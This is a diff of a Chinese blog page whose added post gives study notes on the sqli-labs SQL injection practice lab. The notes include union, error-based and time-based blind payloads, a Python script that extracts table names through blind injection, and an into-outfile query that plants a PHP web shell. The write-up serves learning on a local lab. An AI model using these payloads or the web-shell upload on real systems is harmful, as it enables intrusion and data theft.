@@ -76,7 +76,7 @@
   
 
 
-  <link rel="alternate" href="/atom.xml" title="web小博客" type="application/atom+xml" />
+  <link rel="alternate" href="/atom.xml" title="咸鱼的学习之旅" type="application/atom+xml" />
 
 
 
@@ -87,11 +87,11 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs知识点梳理">
 <meta property="og:url" content="http://yoursite.com/2020/04/10/sqli-labs%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/index.html">
-<meta property="og:site_name" content="web小博客">
+<meta property="og:site_name" content="咸鱼的学习之旅">
 <meta property="og:description" content="sqli-labs知识点梳理">
 <meta property="article:published_time" content="2020-04-10T06:05:27.593Z">
-<meta property="article:modified_time" content="2020-04-10T09:59:41.260Z">
-<meta property="article:author" content="aaron">
+<meta property="article:modified_time" content="2020-04-12T08:02:35.495Z">
+<meta property="article:author" content="aaro135">
 <meta name="twitter:card" content="summary">
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <title>sqli-labs知识点梳理 | web小博客</title>
+  <title>sqli-labs知识点梳理 | 咸鱼的学习之旅</title>
   
 
 
@@ -158,12 +158,12 @@
     <div class="custom-logo-site-title">
       <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">web小博客</span>
+        <span class="site-title">咸鱼的学习之旅</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
       
-        <p class="site-subtitle">welcome</p>
+        <p class="site-subtitle">共勉</p>
       
   </div>
 
@@ -248,13 +248,13 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/10/sqli-labs%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="aaron">
+      <meta itemprop="name" content="aaro135">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="web小博客">
+      <meta itemprop="name" content="咸鱼的学习之旅">
     </span>
 
     
@@ -323,19 +323,49 @@
 
       
         <h1 id="sqli-labs知识点梳理"><a href="#sqli-labs知识点梳理" class="headerlink" title="sqli-labs知识点梳理"></a>sqli-labs知识点梳理</h1><a id="more"></a>
-<p>1.没有做任何防护，直接使用union注入就好了。不过先猜测查询语句格式：</p>
+<p><strong>1.</strong>没有做任何防护，直接使用union注入就好了。不过先猜测查询语句格式：</p>
 <p><code>select * from [table_name] where id  = &#39;input_id&#39; limit 0,1</code></p>
 <p><code>(select group_concat(table_name) from information_schema.tables where table_schema=database())</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">爆出来的结果</span><br><span class="line">emails,referers,uagents,users </span><br><span class="line"></span><br><span class="line">Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,Delete_history_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time </span><br><span class="line"></span><br><span class="line">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>
-<p>2.和第一题一样，主要就是改了下查询语句的格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">爆出来的结果，后面可以参照</span><br><span class="line">emails,referers,uagents,users </span><br><span class="line"></span><br><span class="line">Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,Delete_history_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time </span><br><span class="line"></span><br><span class="line">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>
+<p><strong>2.</strong>和第一题一样，主要就是改了下查询语句的格式</p>
 <p><code>select * from [table_name] where id  = input_id limit 0,1</code></p>
 <p>去掉了引号，上文的payload就失去了效果</p>
-<p>3.和之前的一样，没有什么特别的地方，就是看到了提示single quote with twist，貌似加了括号？？？</p>
+<p><strong>3.</strong>和之前的一样，没有什么特别的地方，就是看到了提示single quote with twist，貌似加了括号？？？</p>
 <p>根据报错信息里面透露的右括号，可以知道</p>
-<p>4.还是有报错，总结下，从几种常用形式来找<code>&#39;input_id&#39;/&quot;input_id&quot;/(&#39;input_id&#39;)/(&quot;input_id&quot;)</code></p>
+<p><strong>4.</strong>还是有报错，总结下，<strong>从几种常用形式来找：</strong><code>&#39;input_id&#39;/&quot;input_id&quot;/(&#39;input_id&#39;)/(&quot;input_id&quot;)</code></p>
 <p>在各种形式的payload拼接好后后面输入任意乱码，如果对了就会报错提示你了</p>
 <p>后续操作如上</p>
-<p>5.</p>
+<p><strong>5.</strong>原来有点一头雾水，后来查了下<strong>double injection</strong> 的意思，叫<strong>双查询注入</strong>，其实就是利用了报错注入中rand函数并构筑虚表时，rand会被执行两次从而报错的原理，mysql特有特性。<strong>报错注入</strong>的原理。</p>
+<p>这里我用了updatexml函数</p>
+<p>payload</p>
+<p><code>-1&#39; or updatexml(0,concat(0x7e,(database())),0)%23</code></p>
+<p>另一篇博客里有其他的注入函数，不赘述了。</p>
+<p><strong>6.</strong>如5，需要双引号</p>
+<p><strong>7.</strong>好像有点意思了，给了提示use outfile,先去百度下<strong>outfile</strong>的用法，就是把结果存到文件里</p>
+<p>看了大佬博客学会了新的思路</p>
+<p>这道是不能直接进行保存文件的，因为对于文件的保存路径有限制</p>
+<p>先得到我们数据存储路径和mysql的安装路径</p>
+<p>Your Login name:E:\XAMPP\mysql\data\ </p>
+<p>Your Password:E:/XAMPP/mysql</p>
+<p>构造以下语句上传一句话木马， <code>1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;aaa&quot;]);?&gt;&#39; into outfile &#39;e:\\XAMPP\\tmp\\data.php&#39;%23</code> </p>
+<p>然后菜刀链接，但是我没成功，应该是我的菜刀有问题。。。</p>
+<p><strong>8.</strong>题目说是<strong>Boolean注入</strong>，但是我发现时间盲注似乎也可以，可以尝试。</p>
+<p>尝试了下可行hhh，给上脚本，可以自己试试，url里随意拼接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">dic &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@&#123;&#125;&#39;</span><br><span class="line">flag &#x3D; &#39;flag???-&gt;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for x in dic:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;localhost:8081&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d&quot;%(i)+&quot;,1))&#x3D;ascii(&#39;%s&quot;%(x)+&quot;&#39;),sleep(2),0)%23&quot;</span><br><span class="line">        try:</span><br><span class="line">            requests.get(url,timeout&#x3D;2)</span><br><span class="line">        except requests.exceptions.Timeout:</span><br><span class="line">            flag &#x3D; flag + x </span><br><span class="line">            print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<p><strong>9.10.时间盲注</strong></p>
+<p>前面的文档里照抄就好</p>
+<p><strong>11.12.报错注入</strong></p>
+<p>两题改变的是单双引号</p>
+<p>附上payload:</p>
+<p>uname=1’ or updatexml(1,concat(0x7e,database()),0)#&amp;passwd=1&amp;submit=Submit</p>
+<p>后面的题目大致类似13.14.15.16，有的对输出有限制，对于输出的结果有限制的，就可以用limit(0,1)显示第一个结果，limit(1,1)显示第二个结果。</p>
+<p><strong>updatequery</strong> 学到了新写法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1234&#39; and (select count(*) from information_schema.tables group by concat_ws(&#39;-&#39;,(select database()),floor(rand(0)*2))) where username&#x3D;&#39;admin&#39;--</span><br></pre></td></tr></table></figure>
+<p><strong>header injection</strong>前面讲过例题，就是那个修改XFF的，也是修改请求头，两个分别是司改referer和user-uagent 的值，需要猜测数据库插入语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】；</span><br><span class="line"></span><br><span class="line">(1)HTTP Referer是header的一部分，当浏览器向web[服务器](https:&#x2F;&#x2F;baike.baidu.com&#x2F;item&#x2F;%E6%9C%8D%E5%8A%A1%E5%99%A8)发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</span><br><span class="line"></span><br><span class="line">(2)X-Forwarded-For:简称XFF头，它代表客户端，用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的&#96;来源IP&#96;追加在&#96;X-Forwarded-For&#96;中</span><br><span class="line"></span><br><span class="line">(3)Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）</span><br><span class="line"></span><br><span class="line">(4)X-Real-IP一般只记录真实发出请求的客户端IP，看下面的例子</span><br><span class="line"></span><br><span class="line">注：源自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;-zhong&#x2F;p&#x2F;10925426.html，更详细请看大佬博客</span><br></pre></td></tr></table></figure>
+<p><strong>Cookie injection</strong> 类似，抓包修改cookie的值</p>
+<p><strong>dump into outfile</strong></p>
+<p>每日一篇，共勉</p>
 
       
     </div>
@@ -369,6 +399,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/12/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BE%8B%E9%A2%98/" rel="prev" title="sql注入分类及例题">
+                sql注入分类及例题 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -437,8 +471,8 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <p class="site-author-name" itemprop="name">aaron</p>
-              <p class="site-description motion-element" itemprop="description">颓废了好久，重启了！</p>
+              <p class="site-author-name" itemprop="name">aaro135</p>
+              <p class="site-description motion-element" itemprop="description">学习给我带来不同的生活！</p>
           </div>
 
           <nav class="site-state motion-element">
@@ -448,7 +482,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -516,7 +550,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">aaron</span>
+  <span class="author" itemprop="copyrightHolder">aaro135</span>
 
   
 </div>
